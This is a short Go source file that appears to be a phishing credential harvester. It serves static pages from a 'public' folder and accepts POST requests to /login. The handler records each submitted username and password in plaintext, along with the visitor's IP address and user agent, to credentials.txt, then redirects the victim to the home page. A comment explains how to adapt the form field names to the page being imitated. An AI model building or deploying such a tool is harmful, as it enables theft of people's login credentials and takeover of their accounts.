package main

import (
	"log"
	"net/http"
	"os"
  "time"
  "github.com/sirupsen/logrus"
  "github.com/gorilla/mux"
)

const PORT = ":80"

func login(w http.ResponseWriter, r *http.Request) {
 logrus.WithFields(logrus.Fields{
  "time": time.Now().String(),
  // - Change this with the names of the form values that you'll use
  "username": r.FormValue("_user"),
  "password": r.FormValue("_pass"),
  // ---------------------------------------------------------------
  "user-agent": r.UserAgent(),
  "ip_address": r.RemoteAddr, 
 }).Info("login attempt")

 http.Redirect(w,r,"/",302)
}

func main() {
 fh, err := os.OpenFile("credentials.txt",os.O_CREATE|os.O_APPEND|os.O_WRONLY,0600)
 if err != nil {
  panic(err)
 }

 defer fh.Close()

 logrus.SetOutput(fh)
 r := mux.NewRouter()
 r.HandleFunc("/login",login).Methods("POST")
 r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
 log.Fatal(http.ListenAndServe(PORT,r))
 
}
